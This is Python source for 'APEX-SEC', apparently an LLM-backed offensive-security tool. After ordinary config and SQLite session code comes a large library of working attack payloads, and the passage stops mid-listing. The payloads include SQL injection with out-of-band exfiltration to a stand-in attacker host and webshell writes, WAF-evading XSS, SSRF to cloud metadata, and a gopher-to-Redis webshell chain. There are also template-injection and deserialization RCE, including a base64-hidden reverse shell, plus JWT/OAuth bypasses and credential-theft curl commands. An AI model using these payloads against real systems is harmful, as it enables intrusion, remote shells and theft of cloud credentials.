#  PART 1 

"""
APEX-SEC - Advanced Cyber Operations Engine
On-premises AI security operations framework.

Requires: Python 3.10+, Ollama running locally, Streamlit
"""

from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import re
import sqlite3
import sys
import time
import uuid
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import quote, unquote

import requests

try:
    import streamlit as st
    _STREAMLIT_AVAILABLE = True
except ImportError:
    st = None
    _STREAMLIT_AVAILABLE = False

try:
    from langchain_community.llms import Ollama
    _OLLAMA_AVAILABLE = True
except ImportError:
    Ollama = None
    _OLLAMA_AVAILABLE = False


APP_NAME = "APEX-SEC"
APP_VERSION = "1.1.0"
APP_TAGLINE = "Advanced Cyber Operations Engine"

BASE_DIR = Path(__file__).resolve().parent
CONFIG_DIR = BASE_DIR / "config"
EVIDENCE_DIR = CONFIG_DIR / "evidence"
REPORTS_DIR = CONFIG_DIR / "reports"
DB_PATH = CONFIG_DIR / "apex_memory.db"
KB_FILE = CONFIG_DIR / "threat_intel.json"
CONFIG_FILE = CONFIG_DIR / "apex_config.json"
LOG_FILE = CONFIG_DIR / "apex_sec.log"
PAYLOAD_DB = CONFIG_DIR / "payload_library.json"

for _d in (CONFIG_DIR, EVIDENCE_DIR, REPORTS_DIR):
    _d.mkdir(parents=True, exist_ok=True)

CISA_FEED_URL = (
    "https://www.cisa.gov/sites/default/files/feeds/"
    "known_exploited_vulnerabilities.json"
)
NVD_API_URL = "https://services.nvd.nist.gov/rest/json/cves/2.0"

HTTP_TIMEOUT = 20
MAX_RETRIES = 3
BACKOFF_BASE = 2.0
MAX_PROMPT_CHARS = 24000


# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------

def _build_logger() -> logging.Logger:
    log = logging.getLogger(APP_NAME)
    if log.handlers:
        return log
    log.setLevel(logging.INFO)
    fmt = logging.Formatter(
        "%(asctime)s | %(levelname)-7s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    try:
        fh = logging.FileHandler(LOG_FILE, encoding="utf-8")
        fh.setFormatter(fmt)
        log.addHandler(fh)
    except OSError:
        pass
    sh = logging.StreamHandler(sys.stdout)
    sh.setFormatter(fmt)
    log.addHandler(sh)
    return log


logger = _build_logger()


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------

def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def safe_name(value: str, max_len: int = 80) -> str:
    cleaned = re.sub(r"[^A-Za-z0-9._-]+", "_", value).strip("._")
    return (cleaned or "artifact")[:max_len]


def human_size(num: int) -> str:
    size = float(num)
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if size < 1024:
            return f"{size:.1f} {unit}"
        size /= 1024
    return f"{size:.1f} PB"


def truncate_text(text: str, limit: int = MAX_PROMPT_CHARS) -> str:
    if len(text) <= limit:
        return text
    head = int(limit * 0.7)
    tail = limit - head - 40
    return text[:head] + "\n...[truncated]...\n" + text[-tail:]


_MISSING = object()


# ---------------------------------------------------------------------------
# Domain models
# ---------------------------------------------------------------------------

@dataclass
class VulnerabilityEntry:
    cve_id: str
    severity: str
    title: str = ""
    description: str = ""
    mitigation: str = ""
    cvss_score: float = 0.0
    cvss_vector: str = ""
    impact: str = ""
    references: List[str] = field(default_factory=list)
    evidence_paths: List[str] = field(default_factory=list)
    tools_used: List[str] = field(default_factory=list)
    steps_to_reproduce: List[str] = field(default_factory=list)
    timestamp: str = field(default_factory=utc_now)


@dataclass
class TargetProfile:
    ip_address: str = ""
    hostname: str = ""
    os_info: str = "Unknown"
    mac_address: str = "Unknown"
    environment: str = "lab"
    scope_notes: str = ""
    organization: str = ""
    authorization_ref: str = ""
    timestamp: str = field(default_factory=utc_now)


@dataclass
class EvidenceItem:
    evidence_id: str
    filename: str
    filepath: str
    mime_type: str
    size_bytes: int
    caption: str = ""
    linked_cve: str = ""
    extracted_text: str = ""
    timestamp: str = field(default_factory=utc_now)


# ---------------------------------------------------------------------------
# Config manager
# ---------------------------------------------------------------------------

class ConfigManager:
    DEFAULTS: Dict[str, Any] = {
        "model": "llama3",
        "temperature": 0.3,
        "top_p": 0.9,
        "num_predict": 2048,
        "context_messages": 30,
        "context_char_budget": MAX_PROMPT_CHARS,
        "persona": "apex-sec",
        "allow_payload_gen": True,
        "custom_prompt": "",
        "report_author": "Security Researcher",
        "report_org": "Independent",
        "vision_model": "",
        "enable_ocr": False,
        "require_scope_ack": True,
    }

    def __init__(self, path: Path = CONFIG_FILE) -> None:
        self._path = path
        self._data: Dict[str, Any] = dict(self.DEFAULTS)
        self._load()

    def _load(self) -> None:
        if not self._path.exists():
            self._save()
            return
        try:
            with self._path.open("r", encoding="utf-8") as fh:
                raw = json.load(fh)
            if isinstance(raw, dict):
                for key in self.DEFAULTS:
                    if key in raw:
                        self._data[key] = raw[key]
        except (json.JSONDecodeError, OSError) as exc:
            logger.warning("Config load failed: %s", exc)

    def _save(self) -> None:
        try:
            tmp = self._path.with_suffix(".tmp")
            with tmp.open("w", encoding="utf-8") as fh:
                json.dump(self._data, fh, indent=2, ensure_ascii=False)
            tmp.replace(self._path)
        except OSError as exc:
            logger.error("Config save failed: %s", exc)

    def get(self, key: str, default: Any = _MISSING) -> Any:
        if default is _MISSING:
            return self._data.get(key, self.DEFAULTS.get(key))
        return self._data.get(key, default)

    def set(self, key: str, value: Any) -> bool:
        if self._data.get(key) == value:
            return False
        self._data[key] = value
        self._save()
        return True

    def update(self, values: Dict[str, Any]) -> bool:
        changed = False
        for k, v in values.items():
            if self._data.get(k) != v:
                self._data[k] = v
                changed = True
        if changed:
            self._save()
        return changed

    def as_dict(self) -> Dict[str, Any]:
        return dict(self._data)


# ---------------------------------------------------------------------------
# Persistent memory (SQLite)
# ---------------------------------------------------------------------------

class MemoryManager:
    def __init__(self, db_path: Path = DB_PATH) -> None:
        self._db_path = str(db_path)
        self._init_schema()

    def _connect(self) -> sqlite3.Connection:
        conn = sqlite3.connect(self._db_path, check_same_thread=False, timeout=10)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA foreign_keys = ON")
        conn.execute("PRAGMA journal_mode = WAL")
        return conn

    def _init_schema(self) -> None:
        try:
            with self._connect() as conn:
                conn.executescript(
                    """
                    CREATE TABLE IF NOT EXISTS sessions (
                        session_id  TEXT PRIMARY KEY,
                        title       TEXT NOT NULL,
                        created_at  TEXT NOT NULL,
                        updated_at  TEXT NOT NULL
                    );
                    CREATE TABLE IF NOT EXISTS messages (
                        id          INTEGER PRIMARY KEY AUTOINCREMENT,
                        session_id  TEXT NOT NULL,
                        role        TEXT NOT NULL,
                        content     TEXT NOT NULL,
                        meta        TEXT,
                        created_at  TEXT NOT NULL,
                        FOREIGN KEY (session_id) REFERENCES sessions(session_id)
                            ON DELETE CASCADE
                    );
                    CREATE TABLE IF NOT EXISTS evidence (
                        evidence_id TEXT PRIMARY KEY,
                        session_id  TEXT NOT NULL,
                        filename    TEXT NOT NULL,
                        filepath    TEXT NOT NULL,
                        mime_type   TEXT NOT NULL,
                        size_bytes  INTEGER NOT NULL,
                        caption     TEXT,
                        linked_cve  TEXT,
                        extracted_text TEXT,
                        created_at  TEXT NOT NULL,
                        FOREIGN KEY (session_id) REFERENCES sessions(session_id)
                            ON DELETE CASCADE
                    );
                    CREATE INDEX IF NOT EXISTS idx_messages_session
                        ON messages(session_id, id);
                    CREATE INDEX IF NOT EXISTS idx_evidence_session
                        ON evidence(session_id);
                    """
                )
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Schema init failed: %s", exc)

    # -- Sessions ---------------------------------------------------------
    def create_session(self, title: str = "New Session",
                       session_id: Optional[str] = None) -> str:
        sid = session_id or str(uuid.uuid4())
        now = utc_now()
        try:
            with self._connect() as conn:
                conn.execute(
                    "INSERT OR IGNORE INTO sessions VALUES (?, ?, ?, ?)",
                    (sid, title, now, now),
                )
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Session create failed: %s", exc)
        return sid

    def list_sessions(self) -> List[Dict[str, Any]]:
        try:
            with self._connect() as conn:
                rows = conn.execute(
                    "SELECT * FROM sessions ORDER BY updated_at DESC"
                ).fetchall()
            return [dict(r) for r in rows]
        except sqlite3.Error:
            return []

    def rename_session(self, session_id: str, title: str) -> None:
        try:
            with self._connect() as conn:
                conn.execute(
                    "UPDATE sessions SET title = ?, updated_at = ? WHERE session_id = ?",
                    (title, utc_now(), session_id),
                )
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Rename failed: %s", exc)

    def delete_session(self, session_id: str) -> None:
        try:
            with self._connect() as conn:
                conn.execute("DELETE FROM messages WHERE session_id = ?", (session_id,))
                conn.execute("DELETE FROM evidence WHERE session_id = ?", (session_id,))
                conn.execute("DELETE FROM sessions WHERE session_id = ?", (session_id,))
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Delete failed: %s", exc)

    # -- Messages ---------------------------------------------------------
    def add_message(self, session_id: str, role: str, content: str,
                    meta: Optional[Dict[str, Any]] = None) -> None:
        try:
            with self._connect() as conn:
                conn.execute(
                    "INSERT INTO messages (session_id, role, content, meta, created_at) "
                    "VALUES (?, ?, ?, ?, ?)",
                    (session_id, role, content, json.dumps(meta or {}), utc_now()),
                )
                conn.execute(
                    "UPDATE sessions SET updated_at = ? WHERE session_id = ?",
                    (utc_now(), session_id),
                )
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Message add failed: %s", exc)

    def get_messages(self, session_id: str,
                     limit: Optional[int] = None,
                     include_errors: bool = False) -> List[Dict[str, Any]]:
        try:
            with self._connect() as conn:
                if limit:
                    rows = conn.execute(
                        "SELECT * FROM ("
                        "  SELECT * FROM messages WHERE session_id = ? "
                        "  ORDER BY id DESC LIMIT ?"
                        ") ORDER BY id ASC",
                        (session_id, limit),
                    ).fetchall()
                else:
                    rows = conn.execute(
                        "SELECT * FROM messages WHERE session_id = ? ORDER BY id ASC",
                        (session_id,),
                    ).fetchall()
            out = []
            for r in rows:
                d = dict(r)
                if not include_errors:
                    try:
                        meta = json.loads(d.get("meta") or "{}")
                    except json.JSONDecodeError:
                        meta = {}
                    if meta.get("error"):
                        continue
                out.append(d)
            return out
        except sqlite3.Error as exc:
            logger.error("Fetch failed: %s", exc)
            return []

    def count_messages(self, session_id: str) -> int:
        try:
            with self._connect() as conn:
                row = conn.execute(
                    "SELECT COUNT(*) AS c FROM messages WHERE session_id = ?",
                    (session_id,),
                ).fetchone()
            return int(row["c"]) if row else 0
        except sqlite3.Error:
            return 0

    def build_context(self, session_id: str, last_n: int = 30,
                      char_budget: int = MAX_PROMPT_CHARS) -> str:
        msgs = self.get_messages(session_id, limit=last_n, include_errors=False)
        if not msgs:
            return ""
        chunks: List[str] = []
        total = 0
        for m in reversed(msgs):
            entry = f"{m['role'].capitalize()}: {m['content']}"
            if total + len(entry) > char_budget:
                break
            chunks.append(entry)
            total += len(entry)
        chunks.reverse()
        return "\n\n".join(chunks)

    # -- Evidence ---------------------------------------------------------
    def add_evidence(self, session_id: str, filename: str, filepath: str,
                     mime_type: str, size_bytes: int, caption: str = "",
                     linked_cve: str = "", extracted_text: str = "") -> str:
        eid = str(uuid.uuid4())
        try:
            with self._connect() as conn:
                conn.execute(
                    "INSERT INTO evidence VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
                    (eid, session_id, filename, filepath, mime_type,
                     size_bytes, caption, linked_cve, extracted_text, utc_now()),
                )
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Evidence add failed: %s", exc)
        return eid

    def list_evidence(self, session_id: str) -> List[Dict[str, Any]]:
        try:
            with self._connect() as conn:
                rows = conn.execute(
                    "SELECT * FROM evidence WHERE session_id = ? ORDER BY created_at ASC",
                    (session_id,),
                ).fetchall()
            return [dict(r) for r in rows]
        except sqlite3.Error:
            return []

    def delete_evidence(self, evidence_id: str) -> None:
        try:
            with self._connect() as conn:
                conn.execute("DELETE FROM evidence WHERE evidence_id = ?", (evidence_id,))
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Evidence delete failed: %s", exc)

    def purge_all(self) -> None:
        try:
            with self._connect() as conn:
                conn.execute("DELETE FROM messages")
                conn.execute("DELETE FROM evidence")
                conn.execute("DELETE FROM sessions")
                conn.commit()
        except sqlite3.Error as exc:
            logger.error("Purge failed: %s", exc)


# = ED PART 1 =
# === PART 2 ===

"""
Payload library, threat intelligence, API testing helpers,
reconnaissance helpers, and evidence management.
"""

import ipaddress
from typing import Iterable

try:
    from PIL import Image
    _PIL_AVAILABLE = True
except ImportError:
    Image = None
    _PIL_AVAILABLE = False


# ---------------------------------------------------------------------------
# Advanced Payload Library
# ---------------------------------------------------------------------------

class PayloadLibrary:
    """
    Curated payload reference for authorized penetration testing.
    Focus on WAF-evasion, context-aware encoding, and real-world
    CVE-derived techniques rather than classroom examples.
    """

    CATEGORIES: Dict[str, List[Dict[str, Any]]] = {

        "sqli": [
            {
                "name": "MySQL UNION with comment obfuscation",
                "payload": "/*!50000UNION*//*!50000SELECT*/NULL,concat(0x3a,user(),0x3a,version()),NULL-- -",
                "notes": "Versioned comment bypass for WAFs that regex plain UNION SELECT.",
                "severity": "critical",
                "tags": ["waf-bypass", "mysql", "union"],
                "dbms": "mysql",
            },
            {
                "name": "MySQL boolean blind with bitwise",
                "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
                "notes": "Error-based extraction without SLEEP, useful when time-based is blocked.",
                "severity": "high",
                "tags": ["mysql", "error", "blind"],
                "dbms": "mysql",
            },
            {
                "name": "PostgreSQL stacked with COPY",
                "payload": "';COPY (SELECT '') TO PROGRAM 'curl http://oob.attacker.tld/$(whoami)';--",
                "notes": "OOB exfil via COPY TO PROGRAM when stacked queries are enabled.",
                "severity": "critical",
                "tags": ["postgres", "oob", "rce"],
                "dbms": "postgres",
            },
            {
                "name": "MSSQL xp_cmdshell via stacked",
                "payload": "';EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami';--",
                "notes": "Enable and invoke xp_cmdshell when the SQL user is sysadmin.",
                "severity": "critical",
                "tags": ["mssql", "rce", "stacked"],
                "dbms": "mssql",
            },
            {
                "name": "Oracle out-of-band via UTL_HTTP",
                "payload": "'||(SELECT UTL_HTTP.REQUEST('http://oob.attacker.tld/'||user) FROM dual)||'",
                "notes": "Oracle OOB when no direct output channel exists.",
                "severity": "high",
                "tags": ["oracle", "oob"],
                "dbms": "oracle",
            },
            {
                "name": "SQLite file write via ATTACH",
                "payload": "';ATTACH DATABASE '/var/www/html/shell.php' AS p;CREATE TABLE p.x(a text);INSERT INTO p.x VALUES('<?php system($_GET[0]);?>');--",
                "notes": "Write a webshell when the SQLite process has write access to web root.",
                "severity": "critical",
                "tags": ["sqlite", "file-write", "rce"],
                "dbms": "sqlite",
            },
            {
                "name": "JSON-wrapped SQLi bypass",
                "payload": "{\"id\":\"1' AND extractvalue(1,concat(0x7e,version()))-- -\"}",
                "notes": "Bypasses filters that only inspect form-encoded parameters.",
                "severity": "high",
                "tags": ["json", "mysql", "waf-bypass"],
                "dbms": "mysql",
            },
            {
                "name": "Second-order via stored procedure",
                "payload": "admin'-- -",
                "notes": "Classic second-order seed. Test on register + lookup flows.",
                "severity": "medium",
                "tags": ["second-order", "auth-bypass"],
                "dbms": "any",
            },
            {
                "name": "Time-based chunked with chunk size",
                "payload": "' AND (SELECT 1 FROM (SELECT SLEEP(5))x)-- -",
                "notes": "Subquery wrapper hides SLEEP from naive signatures.",
                "severity": "high",
                "tags": ["mysql", "time", "waf-bypass"],
                "dbms": "mysql",
            },
            {
                "name": "ORDER BY injection for column count",
                "payload": "1 ORDER BY 1-- -",
                "notes": "Increment until error to determine column count.",
                "severity": "medium",
                "tags": ["recon", "order-by"],
                "dbms": "any",
            },
        ],

        "xss": [
            {
                "name": "SVG onload with entity encoding",
                "payload": "<svg><script>&#x61;lert(1)</script></svg>",
                "notes": "HTML entity encoding defeats keyword filters looking for 'alert'.",
                "severity": "medium",
                "tags": ["waf-bypass", "svg", "encoding"],
                "context": "html",
            },
            {
                "name": "Polyglot XSS-SQLi payload",
                "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                "notes": "Gareth Heyes polyglot, works across HTML, JS, and attribute contexts.",
                "severity": "high",
                "tags": ["polyglot", "context-aware"],
                "context": "mixed",
            },
            {
                "name": "Mutation XSS via DOMPurify bypass",
                "payload": "<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">",
                "notes": "Known mXSS chain against older DOMPurify versions.",
                "severity": "high",
                "tags": ["mxss", "sanitizer-bypass"],
                "context": "html",
            },
            {
                "name": "DOM clobbering to hijack config",
                "payload": "<form id=config><input name=url value=javascript:alert(1)></form>",
                "notes": "Clobbers window.config so later code reads attacker values.",
                "severity": "high",
                "tags": ["dom", "clobbering"],
                "context": "dom",
            },
            {
                "name": "CSP bypass via JSONP endpoint",
                "payload": "<script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert(1)\"></script>",
                "notes": "When CSP allows script-src whitelisted JSONP hosts.",
                "severity": "high",
                "tags": ["csp-bypass", "jsonp"],
                "context": "html",
            },
            {
                "name": "AngularJS sandbox escape (1.6+)",
                "payload": "{{constructor.constructor('alert(1)')()}}",
                "notes": "For pages including AngularJS without CSP.",
                "severity": "high",
                "tags": ["angular", "sandbox-escape"],
                "context": "angular",
            },
            {
                "name": "Markdown-based XSS",
                "payload": "[click](javascript:alert`1`)",
                "notes": "For markdown renderers that don't sanitize link schemes.",
                "severity": "medium",
                "tags": ["markdown"],
                "context": "markdown",
            },
            {
                "name": "CSS injection exfiltration",
                "payload": "input[name=csrf][value^=a]{background:url(https://oob.attacker.tld/?a)}",
                "notes": "Blind CSS exfil of attribute values character by character.",
                "severity": "medium",
                "tags": ["css", "blind", "exfil"],
                "context": "css",
            },
        ],

        "ssrf": [
            {
                "name": "Cloud metadata via decimal IP",
                "payload": "http://2852039166/latest/meta-data/iam/security-credentials/",
                "notes": "Decimal-encoded 169.254.169.254 bypasses string-based SSRF filters.",
                "severity": "critical",
                "tags": ["aws", "imds", "encoding"],
                "target": "cloud",
            },
            {
                "name": "IPv6-mapped IPv4 metadata",
                "payload": "http://[::ffff:169.254.169.254]/latest/meta-data/",
                "notes": "When filters block dotted-quad but miss IPv6-mapped form.",
                "severity": "critical",
                "tags": ["aws", "ipv6", "waf-bypass"],
                "target": "cloud",
            },
            {
                "name": "DNS rebinding via nip.io",
                "payload": "http://169.254.169.254.nip.io/latest/meta-data/",
                "notes": "DNS resolution bypass for host-based allow-lists.",
                "severity": "critical",
                "tags": ["dns-rebind", "cloud"],
                "target": "cloud",
            },
            {
                "name": "Gopher to Redis RCE",
                "payload": "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A3%0D%0A%246%0D%0Aset%0D%0A%243%0D%0Ax%0D%0A%2425%0D%0A%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3B%3F%3E%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A",
                "notes": "Full gopher chain to write a webshell via exposed Redis.",
                "severity": "critical",
                "tags": ["gopher", "redis", "rce"],
                "target": "internal",
            },
            {
                "name": "File wrapper to /proc/self/environ",
                "payload": "file:///proc/self/environ",
                "notes": "Read environment variables when SSRF supports file://.",
                "severity": "high",
                "tags": ["file", "linux"],
                "target": "internal",
            },
            {
                "name": "Docker socket via unix scheme",
                "payload": "unix:///var/run/docker.sock",
                "notes": "Docker socket reachable via SSRF means container escape.",
                "severity": "critical",
                "tags": ["docker", "escape"],
                "target": "internal",
            },
            {
                "name": "Kubernetes API server",
                "payload": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
                "notes": "From inside a pod, SSRF to kube-apiserver with SA token.",
                "severity": "critical",
                "tags": ["k8s", "cloud"],
                "target": "cloud",
            },
        ],

        "ssti": [
            {
                "name": "Jinja2 RCE via __subclasses__",
                "payload": "{{''.__class__.__mro__[1].__subclasses__()[409]('id',shell=True,stdout=-1).communicate()}}",
                "notes": "Adjust index for target Python version. Classic Jinja2 RCE.",
                "severity": "critical",
                "tags": ["jinja2", "rce", "python"],
                "engine": "jinja2",
            },
            {
                "name": "Jinja2 via lipsum globals",
                "payload": "{{ lipsum.__globals__['os'].popen('id').read() }}",
                "notes": "Shorter chain when lipsum is exposed.",
                "severity": "critical",
                "tags": ["jinja2", "rce", "short"],
                "engine": "jinja2",
            },
            {
                "name": "Twig 3.x RCE",
                "payload": "{{['id']|filter('system')}}",
                "notes": "Twig 3 with filter callback registration.",
                "severity": "critical",
                "tags": ["twig", "rce", "php"],
                "engine": "twig",
            },
            {
                "name": "Freemarker Execute",
                "payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                "notes": "Classic Freemarker RCE when ?new() is allowed.",
                "severity": "critical",
                "tags": ["freemarker", "rce", "java"],
                "engine": "freemarker",
            },
            {
                "name": "Velocity template RCE",
                "payload": "#set($e=\"e\")#set($run=$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\"))",
                "notes": "Velocity 1.x RCE via reflection.",
                "severity": "critical",
                "tags": ["velocity", "rce", "java"],
                "engine": "velocity",
            },
            {
                "name": "Handlebars prototype pollution",
                "payload": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{/with}}{{/with}}{{/with}}",
                "notes": "Handlebars < 4.7.7 prototype chain RCE.",
                "severity": "critical",
                "tags": ["handlebars", "rce", "nodejs"],
                "engine": "handlebars",
            },
            {
                "name": "Smarty {php} tag",
                "payload": "{php}system('id');{/php}",
                "notes": "Only works when {php} is enabled (rare but seen).",
                "severity": "high",
                "tags": ["smarty", "php"],
                "engine": "smarty",
            },
        ],

        "jwt": [
            {
                "name": "alg=none with mixed case",
                "payload": "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
                "notes": "Some libraries accept 'None' 'NONE' 'nOnE'.",
                "severity": "critical",
                "tags": ["jwt", "none"],
            },
            {
                "name": "HMAC to RSA confusion",
                "payload": "Sign HMAC with the public RSA key as secret",
                "notes": "Classic algorithm confusion when server trusts header alg.",
                "severity": "critical",
                "tags": ["jwt", "confusion"],
            },
            {
                "name": "kid path traversal",
                "payload": "{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}",
                "notes": "Server reads empty secret, signs with empty key.",
                "severity": "critical",
                "tags": ["jwt", "kid"],
            },
            {
                "name": "kid SQL injection",
                "payload": "{\"alg\":\"HS256\",\"kid\":\"x' UNION SELECT 'known-secret'--\"}",
                "notes": "When kid is queried from DB without parameterization.",
                "severity": "critical",
                "tags": ["jwt", "kid", "sqli"],
            },
            {
                "name": "jku header hijack",
                "payload": "{\"alg\":\"RS256\",\"jku\":\"https://attacker.tld/jwks.json\"}",
                "notes": "Server fetches attacker-controlled JWKS.",
                "severity": "critical",
                "tags": ["jwt", "jku", "ssrf"],
            },
            {
                "name": "Weak secret crack (hashcat)",
                "payload": "hashcat -a 0 -m 16500 token.txt rockyou.txt",
                "notes": "Crack HS256 secret from wordlist.",
                "severity": "high",
                "tags": ["jwt", "crack"],
            },
        ],

        "oauth": [
            {
                "name": "redirect_uri path confusion",
                "payload": "https://target.tld/callback/../attacker.tld",
                "notes": "Path-normalization bypasses exact-match validation.",
                "severity": "critical",
                "tags": ["oauth", "redirect"],
            },
            {
                "name": "redirect_uri subdomain wildcard",
                "payload": "https://attacker.target.tld/callback",
                "notes": "When validation only checks suffix match.",
                "severity": "critical",
                "tags": ["oauth", "redirect"],
            },
            {
                "name": "POST-body redirect_uri",
                "payload": "redirect_uri=https://attacker.tld",
                "notes": "Some servers validate query but not body.",
                "severity": "high",
                "tags": ["oauth", "redirect"],
            },
            {
                "name": "Scope upgrade via consent replay",
                "payload": "Re-submit authorization request with elevated scope after user consent",
                "notes": "Consent tied to client but not scope.",
                "severity": "high",
                "tags": ["oauth", "scope"],
            },
            {
                "name": "PKCE downgrade",
                "payload": "Remove code_challenge and code_challenge_method",
                "notes": "Server must enforce PKCE when client registered as public.",
                "severity": "high",
                "tags": ["oauth", "pkce"],
            },
            {
                "name": "OAuth code interception via referrer",
                "payload": "Referrer-Policy: unsafe-url on redirect page",
                "notes": "Leaks code to third-party via Referer header.",
                "severity": "high",
                "tags": ["oauth", "referrer"],
            },
        ],

        "deserialization": [
            {
                "name": "Java CommonsCollections via ysoserial",
                "payload": "java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=}|{base64,-d}|bash'",
                "notes": "Generate gadget chain, base64-encode the command to survive shell quoting.",
                "severity": "critical",
                "tags": ["java", "ysoserial", "rce"],
                "lang": "java",
            },
            {
                "name": "Java URLDNS probe",
                "payload": "java -jar ysoserial.jar URLDNS 'http://oob.attacker.tld'",
                "notes": "Harmless DNS probe to confirm deserialization sink.",
                "severity": "medium",
                "tags": ["java", "recon"],
                "lang": "java",
            },
            {
                "name": "Python pickle RCE",
                "payload": "import pickle,os\nclass E:\n    def __reduce__(self):\n        return (os.system,('id',))\nprint(pickle.dumps(E()).hex())",
                "notes": "Build the payload locally, then paste the hex into the vulnerable field.",
                "severity": "critical",
                "tags": ["python", "pickle", "rce"],
                "lang": "python",
            },
            {
                "name": "PHP unserialize POP chain",
                "payload": "O:4:\"Evil\":1:{s:3:\"cmd\";s:2:\"id\";}",
                "notes": "Requires a POP chain in the loaded application.",
                "severity": "critical",
                "tags": ["php", "unserialize"],
                "lang": "php",
            },
            {
                "name": ".NET ysoserial.net ObjectDataProvider",
                "payload": "ysoserial.exe -g ObjectDataProvider -f Json.Net -c \"powershell -c whoami\"",
                "notes": "Json.NET deserialization RCE.",
                "severity": "critical",
                "tags": ["dotnet", "rce"],
                "lang": "dotnet",
            },
            {
                "name": "Ruby Marshal deserialization",
                "payload": "Marshal.load(\"\\x04\\b[\\x06:\\x0e@cmdI\\\"\\x08id\\x06:\\x06ET\")",
                "notes": "Legacy Ruby apps that Marshal.load user data.",
                "severity": "critical",
                "tags": ["ruby", "marshal"],
                "lang": "ruby",
            },
        ],

        "race": [
            {
                "name": "Coupon redemption race",
                "payload": "Send N parallel POSTs to /redeem with same coupon code",
                "notes": "TOCTOU in balance check. Use Turbo Intruder single-packet attack.",
                "severity": "high",
                "tags": ["toctou", "ecommerce"],
            },
            {
                "name": "File upload race with cleanup",
                "payload": "Upload shell + trigger deletion in parallel",
                "notes": "Read shell between write and unlink.",
                "severity": "high",
                "tags": ["upload", "toctou"],
            },
            {
                "name": "Password reset token reuse",
                "payload": "Submit token twice in parallel",
                "notes": "Token invalidation is often non-atomic.",
                "severity": "high",
                "tags": ["auth", "toctou"],
            },
        ],

        "ldapi": [
            {
                "name": "Anonymous bind enumeration",
                "payload": "ldapsearch -x -H ldap://target.tld -b 'dc=corp,dc=local' '(objectClass=user)'",
                "notes": "Frequently returns full directory.",
                "severity": "high",
                "tags": ["ldap", "enum"],
            },
            {
                "name": "LDAP injection in auth filter",
                "payload": "*)(uid=*))(|(uid=*",
                "notes": "Bypasses filter logic when input unsanitized.",
                "severity": "high",
                "tags": ["ldap", "auth-bypass"],
            },
            {
                "name": "ADCS ESC1 template abuse",
                "payload": "certipy req -u user@corp.local -p pass -ca CORP-CA -template User -upn administrator@corp.local",
                "notes": "Request cert as admin when template allows SAN.",
                "severity": "critical",
                "tags": ["ad", "adcs", "privesc"],
            },
        ],

        "cloud": [
            {
                "name": "AWS role chain via IMDSv1",
                "payload": "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "notes": "Prefer IMDSv2 token flow when v1 disabled.",
                "severity": "critical",
                "tags": ["aws", "imds"],
                "provider": "aws",
            },
            {
                "name": "AWS IMDSv2 two-step",
                "payload": "TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'); curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "notes": "Required when hop limit = 1 and v1 disabled.",
                "severity": "critical",
                "tags": ["aws", "imdsv2"],
                "provider": "aws",
            },
            {
                "name": "Azure managed identity token",
                "payload": "curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true",
                "notes": "Returns ARM token for the assigned identity.",
                "severity": "critical",
                "tags": ["azure", "imds"],
                "provider": "azure",
            },
            {
                "name": "GCP service account token",
                "payload": "curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token'",
                "notes": "Short-lived OAuth token for the default SA.",
                "severity": "critical",
                "tags": ["gcp", "imds"],
                "provider": "gcp",
